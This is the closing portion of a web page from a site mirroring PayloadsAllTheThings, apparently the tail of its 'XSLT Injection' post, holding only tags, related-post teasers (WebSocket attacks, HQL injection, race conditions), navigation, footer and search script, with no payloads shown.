            <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>
            by the author.
          </div>
          

          <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=XSLT Injection - PayloadsAllTheThings&url=http://localhost:4000/XSLT-Injection/" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=XSLT Injection - PayloadsAllTheThings&u=http://localhost:4000/XSLT-Injection/" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://telegram.me/share?text=XSLT Injection - PayloadsAllTheThings&url=http://localhost:4000/XSLT-Injection/" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i class="fa-fw fas fa-link small" onclick="copyLink()"
        data-toggle="tooltip" data-placement="top" title="Copy link"></i>

  </span>
</div>


        </div><!-- .post-tail-bottom -->

      </div><!-- div.post-tail -->

    </div> <!-- .post -->


  </div> <!-- #post-wrapper -->

  

  

  <!--
  The Pannel on right side (Desktop views)
-->

<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

  <div class="access">

  














  

  















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



  
    <div id="access-tags">
      <span>Trending Tags</span>
      <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

      
        
        <a class="post-tag" href="/tags/injection/">Injection</a>
      
        
        <a class="post-tag" href="/tags/database/">Database</a>
      
        
        <a class="post-tag" href="/tags/server/">Server</a>
      
        
        <a class="post-tag" href="/tags/network/">Network</a>
      
        
        <a class="post-tag" href="/tags/windows/">Windows</a>
      
        
        <a class="post-tag" href="/tags/exploits/">Exploits</a>
      
        
        <a class="post-tag" href="/tags/shell/">Shell</a>
      
        
        <a class="post-tag" href="/tags/sql/">SQL</a>
      
        
        <a class="post-tag" href="/tags/xss/">XSS</a>
      
        
        <a class="post-tag" href="/tags/attack/">Attack</a>
      

      </div>
    </div>
  
  </div> <!-- .access -->

  
    <!-- BS-toc.js will be loaded at medium priority -->
    <script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>
    <div id="toc-wrapper" class="pl-0 pr-4 mb-5">
      <span class="pl-3 pt-2 mb-2">Contents</span>
      <nav id="toc" data-toggle="toc"></nav>
    </div>
  

</div> <!-- #panel-wrapper -->


</div> <!-- .row -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

    <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->






  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/Web-Socket/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Apr 11, 2020
  

  <i class="unloaded">2020-04-11T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Web Socket Attack</h3>
            <div class="text-muted small">
              <p>
                





                
  The WebSocket protocol allows a bidirectional and full-duplex communication between a client and a server


Summary


  Tools
  Using ws-harness.py


Tools


  ws-harness.py


Using ws-harness.p...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/HQL-Injection/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Oct 29, 2019
  

  <i class="unloaded">2019-10-29T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>HQL Injection</h3>
            <div class="text-muted small">
              <p>
                





                Hibernate Query Language Injection


  Hibernate ORM (Hibernate in short) is an object-relational mapping tool for the Java programming language. It provides a framework for mapping an object-orien...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/Race-Condition/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Jan 26, 2020
  

  <i class="unloaded">2020-01-26T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Race Condition</h3>
            <div class="text-muted small">
              <p>
                





                Race Condition


  Race conditions may occur when a process is critically or unexpectedly dependent on the sequence or timings of other events. In a web application environment, where multiple requ...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->



    <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/CSRF-Injection/" class="btn btn-outline-primary"
    prompt="Older">
    <p>CSRF Injection</p>
  </a>
  

  
  <a href="/Race-Condition/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>Race Condition</p>
  </a>
  

</div>


    

    </div> <!-- #post-extend-wrapper -->

  </div> <!-- .col-* -->

</div> <!-- .row -->



        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center">
    <div class="footer-left">
      <p class="mb-0">
        © 2022
        <a href="https://twitter.com/Zxce3_">Zxce3</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        Powered by
        <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
        with
        <a href="https://github.com/cotes2020/jekyll-theme-chirpy"
          target="_blank" rel="noopener">Chirpy</a>
        theme.
      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      <h4 class="text-muted mb-4">Trending Tags</h4>

      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



      
        
        <a class="post-tag" href="/tags/injection/">Injection</a>
      
        
        <a class="post-tag" href="/tags/database/">Database</a>
      
        
        <a class="post-tag" href="/tags/server/">Server</a>
      
        
        <a class="post-tag" href="/tags/network/">Network</a>
      
        
        <a class="post-tag" href="/tags/windows/">Windows</a>
      
        
        <a class="post-tag" href="/tags/exploits/">Exploits</a>
      
        
        <a class="post-tag" href="/tags/shell/">Shell</a>
      
        
        <a class="post-tag" href="/tags/sql/">SQL</a>
      
        
        <a class="post-tag" href="/tags/xss/">XSS</a>
      
        
        <a class="post-tag" href="/tags/attack/">Attack</a>
      

    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="http://localhost:4000{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


  </body>

</html>

